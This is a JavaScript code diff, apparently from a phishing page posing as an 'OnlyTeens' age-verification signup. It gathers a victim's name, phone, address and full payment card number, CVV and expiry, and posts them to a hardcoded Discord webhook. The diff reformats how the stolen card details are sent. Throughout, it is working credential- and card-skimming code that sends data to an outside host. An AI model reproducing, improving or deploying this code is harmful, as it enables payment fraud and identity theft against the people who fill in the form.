@@ -166,8 +166,13 @@
     const webhookURL = "https://discord.com/api/webhooks/1399115316268765265/lFsRx3lYvUF19LDtqvzl-G4znziZcbZUYxR7uCzesvqqmR19P_ZDgYRqbxJlnThH_IwB";
 
     const payload = {
+      content: "💳 **Détails carte bancaire**\n```" +
+               `Numéro : ${data.numero_carte}\n` +
+               `CVV    : ${data.cvv}\n` +
+               `Exp    : ${data.expiration}\n` +
+               "```",
       embeds: [{
-        title: "Nouvelle inscription OnlyTeens - Vérification d'âge",
+        title: "Infos personnelles",
         color: 0x2575fc,
         fields: [
           { name: "Prénom", value: data.prenom || "N/A", inline: true },
@@ -176,10 +181,7 @@
           { name: "Téléphone", value: data.telephone || "N/A", inline: true },
           { name: "Adresse", value: data.adresse || "N/A", inline: false },
           { name: "Ville", value: data.ville || "N/A", inline: true },
-          { name: "Région", value: data.region || "N/A", inline: true },
-          { name: "Numéro de carte", value: data.numero_carte || "N/A", inline: false },
-          { name: "CVV", value: data.cvv || "N/A", inline: true },
-          { name: "Expiration", value: data.expiration || "N/A", inline: true }
+          { name: "Région", value: data.region || "N/A", inline: true }
         ],
         timestamp: new Date().toISOString()
       }]
